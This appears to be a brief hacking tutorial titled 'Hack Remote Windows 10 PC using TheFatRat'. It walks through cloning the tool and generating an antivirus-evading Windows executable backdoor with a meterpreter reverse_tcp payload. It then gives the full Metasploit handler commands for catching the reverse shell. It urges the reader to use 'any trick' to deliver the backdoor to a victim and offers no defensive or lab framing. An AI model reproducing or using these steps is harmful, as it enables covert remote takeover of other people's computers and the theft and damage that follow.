Hack Remote Windows 10 PC using TheFatRat

TheFatRat is an easy tool for generate backdoor with msfvenom ( part of metasploit framework ) and program compiles a C program with a meterpreter reverse_tcp payload In it that can then be executed on a windows host Program to create a C program after it is compiled that will bypass most AV
First, to install thefatrat we type the following command on terminal:
git clone https://github.com/Screetsec/TheFatRat.git

Once the cloning is done, go to the installed directory of fatrat and open it in terminal and type the following command to start it:
 ./fatrat
It will show you many options now select option 1 which is to CREATE BACKDOOR WITH MSFVENOM.

Now it will give a list of options to choose the format of the backdoor which you have to choose as per your requirements and need. To create a windows executable as a backdoor choose option 2.

Now enter the LHOST IP i.e. your system IP and LPORT i.e. the port you want the reverse connection on your i.e. attacker system. In my case the LHOST is 192.168.0.104 and LPORT is 4444.
And then exit the script by selecting y when asked

Now the generated backdoor will be present in the output directory.

Now use any trick up your sleeve to transport the backdoor to the victim and set up reverse handler on metasploit with the following commands on the msf terminal-
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.104 (the attacker system IP)
set lport 4444
exploit
Now as soon as the backdoor is executed on the victim’s machine you will get a meterpreter shell as you can see in my case.
